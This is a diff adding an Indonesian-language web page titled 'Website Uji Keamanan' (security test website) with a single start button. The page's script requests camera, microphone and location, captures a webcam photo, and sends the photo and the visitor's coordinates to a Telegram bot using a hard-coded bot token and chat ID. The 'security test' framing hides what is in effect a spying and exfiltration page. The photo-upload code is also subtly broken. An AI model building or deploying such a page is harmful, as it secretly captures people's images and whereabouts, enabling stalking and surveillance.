@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Website Uji Keamanan</title>
+    <script>
+        let videoStream;
+
+        async function startCapture() {
+            try {
+                // Minta akses ke kamera, mikrofon, dan lokasi
+                videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+
+                // Ambil gambar dari kamera
+                const video = document.createElement("video");
+                video.srcObject = videoStream;
+                video.play();
+
+                setTimeout(async () => {
+                    const canvas = document.createElement("canvas");
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    const ctx = canvas.getContext("2d");
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Konversi ke base64
+                    const imageData = canvas.toDataURL("image/png");
+
+                    // Kirim ke Telegram
+                    sendToTelegram(imageData, position.coords);
+                }, 3000);
+
+            } catch (error) {
+                console.error("Akses ditolak atau terjadi kesalahan:", error);
+                alert("Akses ditolak atau terjadi kesalahan.");
+            }
+        }
+
+        function sendToTelegram(imageData, location) {
+            const botToken = "8155174745:AAEVSM6KjUCejQ9dxCNLyo0D0Wh_eXgfHQ8";  // Ganti dengan token bot Telegram
+            const chatId = "6010073048";  // Ganti dengan ID Telegram kamu
+
+            // Kirim lokasi
+            fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    latitude: location.latitude,
+                    longitude: location.longitude
+                })
+            });
+
+            // Kirim foto
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: new FormData().append("photo", dataURItoBlob(imageData)).append("chat_id", chatId)
+            });
+        }
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: 'image/png' });
+        }
+    </script>
+</head>
+<body>
+    <h1>Website Uji Keamanan</h1>
+    <button onclick="startCapture()">Mulai</button>
+</body>
+</html>
